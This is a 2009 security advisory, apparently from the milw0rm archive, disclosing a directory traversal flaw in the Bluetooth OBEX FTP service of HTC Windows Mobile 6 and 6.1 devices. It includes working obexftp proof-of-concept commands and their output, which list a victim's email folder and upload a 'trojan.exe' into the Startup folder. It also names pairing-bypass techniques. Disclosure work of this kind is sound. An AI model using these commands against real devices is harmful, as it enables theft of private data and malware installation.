@@ -1,0 +1,116 @@
+I shall complete the information related to Bugtraq ID: 33359
+
+Title: HTC / Windows Mobile OBEX FTP Service Directory Traversal 
+Author: Alberto Moreno Tablado
+Vendor: HTC
+Vulnerable Products:
+- HTC devices running Windows Mobile 6
+- HTC devices running Windows Mobile 6.1
+Non vulnerable products: 
+- HTC devices running Windows Mobile 5.0
+- Other vendors’ Windows Mobile devices
+References: http://www.seguridadmobile.com/windows-mobile/windows-mobile-security/HTC-Windows-Mobile-OBEX-FTP-Service-Directory-Traversal.html
+
+Summary:
+HTC devices running Windows Mobile 6 and Windows Mobile 6.1 are prone to a directory traversal vulnerability in the Bluetooth OBEX FTP Service. Exploiting this issue allows a remote authenticated attacker to list arbitrary directories, and write or read arbitrary files, via a ../ in a pathname. This can be leveraged for code execution by writing to a Startup folder.
+
+Description:
+There exists a Directory Traversal vulnerability in the OBEX FTP Service in the Bluetooth Stack implemented in HTC devices running Windows Mobile 6 and Windows Mobile 6.1. The OBEX FTP server is located in \Windows\obexfile.dll. Microsoft states this is a 3rd party driver developed by HTC and installed on HTC devices running Windows Mobile, so the vulnerability only affects to this vendor specifically.
+
+A remote attacker (who previously owned authentication and authorization rights) can use tools like ObexFTP or gnomevfs-ls from a Linux box to traverse to parent directories out of the default Bluetooth shared folder by using ../ or ..\\ marks.
+
+The only requirement is that the attacker must have authentication and authorization privileges over Bluetooth. Pairing up with the remote device should be enough to get it; however, more sophisticated attacks, such as sniffing the Bluetooth pairing, linkkey cracking and BD_ADDR address spoofing, can be used in order to avoid this. Devices must have Bluetooth enabled and File Sharing over Bluetooth service active when the attack is performed. In case the attacker succeeded in getting the proper privileges, further actions will be transparent to the user.
+
+The scope of the Directory Traversal vulnerability allows the attacker to traverse to parent directories out of the default Bluetooth shared folder by using ../ or ..\\ marks. This security flaw leads to browse folders located anywhere in the file system, download files contained in any folder as well as upload files to any folder.
+
+A remote attacker who previously owned authentication and authorization rights over Bluetooth can perform three risky actions on the device:
+
+1) Browse directories located out of the limits of the default shared folder
+
+An attacker can discover the structure of the file system and access to any directory within it, including: 
+- The flash hard drive
+- The external storage card
+- The internal mass storage memory, included in specific HTC devices
+
+2) Download files without permission
+
+An attacker can download sensitive files located anywhere in the file system, such as: 
+- personal pictures and documents located in \My Documents or any other directory
+- Contacts, Calendar & Tasks information located in \PIM.vol
+- Temporary internet cache and cookies located in \Windows\Profiles\guest\
+- emails located in \Windows\Messaging
+
+gospel@gospel-shift:~/bluez$ obexftp -b 00:17:83:02:BA:3C -l "../../Windows/Messaging"
+Browsing 00:17:83:02:BA:3C ...
+Channel: 4
+Connecting...done
+Receiving "../../Windows/Messaging"... Sending ".."... Sending ".."... Sending "Windows"... done
+<?xml version="1.0"?>
+<!DOCTYPE folder-listing SYSTEM "obex-folder-listing.dtd">
+<folder-listing version="1.0">
+  <parent-folder name="Windows" />
+  <folder name="Attachments" created="20090119T171318Z"/>
+  <file name="6238002d81030102.mpb" created="20090119T173434Z" size="1521"/>
+  <file name="6839002d81030102.mpb" created="20090119T171828Z" size="2659"/>
+</folder-listing>
+done
+Disconnecting...done
+gospel@gospel-shift:~/bluez$
+
+3) Upload malicious files 
+
+An attacker can replace third party or system executable files with malicious files as well as upload trojans to any place in the filesystem, such as \Windows\Startup and, therefore, shall be executed the next time Windows Mobile inits.
+
+gospel@gospel-shift:~/bluez$ obexftp -b 00:17:83:02:BA:3C -c "../../Windows/Startup" -p trojan.exe
+Browsing 00:17:83:02:BA:3C ...
+Channel: 4
+Connecting...done
+Sending ".."... Sending ".."... Sending "Windows"... Sending "Startup"... done
+Sending "trojan.exe"...\done
+Disconnecting...done
+gospel@gospel-shift:~/bluez$ obexftp -b 00:17:83:02:BA:3C -l "../../Windows/Startup"
+Browsing 00:17:83:02:BA:3C ...
+Channel: 4
+Connecting...done
+Receiving "../../Windows/Startup"... Sending ".."... Sending ".."... Sending "Windows"... done
+<?xml version="1.0"?>
+<!DOCTYPE folder-listing SYSTEM "obex-folder-listing.dtd">
+<folder-listing version="1.0">
+  <parent-folder name="Windows" />
+  <file name="trojan.exe" created="20090122T121924Z" size="266168"/>
+  <file name="poutlook.lnk" created="20061231T230022Z" size="14"/>
+</folder-listing>
+done
+Disconnecting...done
+gospel@gospel-shift:~/bluez$
+
+About affected and non affected products:
+The following HTC devices are affected by this vulnerability: 
+- HTC devices running Windows Mobile 6 Professional
+- HTC devices running Windows Mobile 6 Standard
+- HTC devices running Windows Mobile 6.1 Professional 
+- HTC devices running Windows Mobile 6.1 Standard
+
+You can find a list of tested HTC devices proved to be vulnerable at http://www.seguridadmobile.com/windows-mobile/windows-mobile-security/HTC-Windows-Mobile-OBEX-FTP-Service-Directory-Traversal.html#AffectedProducts
+
+HTC devices running Windows Mobile 5.0 are not affected because the OBEX FTP service is not implemented in that OS version.
+
+Other vendors’ Windows Mobile devices are not affected either: ASUS, Samsung, LG, ...
+
+Vendor Status:
+The vulnerability was first disclosed on 2009/01/19 as a whole Microsoft Bluetooth Stack issue in Windows Mobile 6 Professional. Subsequent tests proved that several Windows Mobile 6 Standard and Windows Mobile 6.1 Professional devices were also vulnerable. Microsoft was contacted on 2009/01/22 and this information was not made public because last mobile phones manufactured were vulnerable.
+
+Further investigations proved that the issue is in a 3rd party driver installed by HTC, this vulnerability only affects to HTC devices and other vendors’ Windows Mobile devices are not affected.
+
+HTC Europe has been contacted since 2009/02/09 and provided with all the details concerning on the exploitation of the flaw. However, no patches are known to be released for this security flaw.
+
+Workaround:
+This vulnerability is a zero-day threat. This means that all devices shipped up to date (July 2009) may be vulnerable.
+
+Wait for proper vendor response and updates.
+
+Do not accept pairing nor connection requests from unknown sources. Delete old entries in the paired devices list.
+
+Alberto
+
+# milw0rm.com [2009-07-10]
